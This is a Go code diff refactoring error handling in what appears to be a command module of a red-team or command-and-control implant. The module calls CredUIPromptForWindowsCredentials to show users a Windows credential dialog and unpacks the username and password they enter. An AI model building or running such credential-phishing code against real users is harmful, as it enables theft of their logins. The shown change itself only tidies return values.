@@ -55,11 +55,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -100,19 +96,11 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	)
 
 	if ret == errorCancelled {
-		return structs.CommandResult{
-			Output:    "User cancelled the dialog",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("User cancelled the dialog")
 	}
 
 	if ret != errorSuccess {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CredUIPromptForWindowsCredentials failed: error %d", ret),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("CredUIPromptForWindowsCredentials failed: error %d", ret)
 	}
 
 	// Unpack the authentication buffer to get username, domain, password
@@ -138,11 +126,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	)
 
 	if ok == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CredUnPackAuthenticationBuffer failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("CredUnPackAuthenticationBuffer failed: %v", err)
 	}
 
 	username := syscall.UTF16ToString(userBuf[:userLen])
@@ -156,11 +140,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 	defer structs.ZeroString(&password)
 
 	if password == "" {
-		return structs.CommandResult{
-			Output:    "User submitted empty password",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("User submitted empty password")
 	}
 
 	// Build display account name
